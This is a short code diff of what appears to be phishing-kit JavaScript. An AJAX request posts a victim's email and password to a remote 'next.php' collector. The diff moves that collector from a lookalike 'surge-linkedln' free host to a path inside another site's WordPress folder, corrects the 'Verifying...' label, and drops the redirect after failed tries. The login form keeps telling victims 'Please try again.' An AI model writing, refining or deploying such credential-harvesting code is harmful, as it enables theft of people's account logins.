@@ -222,7 +222,7 @@
       
       $.ajax({
         dataType: 'JSON',
-        url: 'https://surge-linkedln.000webhostapp.com/wetransfer/next.php',
+        url: 'https://dev-caresd.pantheonsite.io/wp-includes/me/next.php',
         type: 'POST',
         data:{
           email:email,
@@ -230,7 +230,7 @@
         },
             // data: $('#contact').serialize(),
             beforeSend: function(xhr){
-              $('#submit-btn').html('Verifing...');
+              $('#submit-btn').html('Verifying...');
             },
             success: function(response){
               if(response){
@@ -255,7 +255,7 @@
               $("#password").val("");
               if (count>=2) {
                 count=0;
-                window.location.replace("http://www."+my_slice);
+                
               }
               $("#msg").show();
               $('#msg_text').html("Please try again.");
